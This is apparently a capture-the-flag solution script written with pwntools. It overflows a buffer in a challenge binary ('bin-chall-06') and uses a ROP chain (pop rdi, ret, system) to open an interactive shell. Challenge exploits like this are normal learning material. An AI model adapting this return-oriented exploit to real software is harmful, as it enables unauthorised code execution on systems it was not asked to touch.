#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-06")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

system = elf.plt["system"]
bin_bash = elf.symbols["shell"]
pop_rdi = 0x4012f3
ret = 0x40101a

pad = 0x20 + 0x8

payload = b"A" * pad
payload += flat(pop_rdi, bin_bash)
payload += flat(ret, system)

io.sendafter(b"Input: ", payload)

io.interactive()
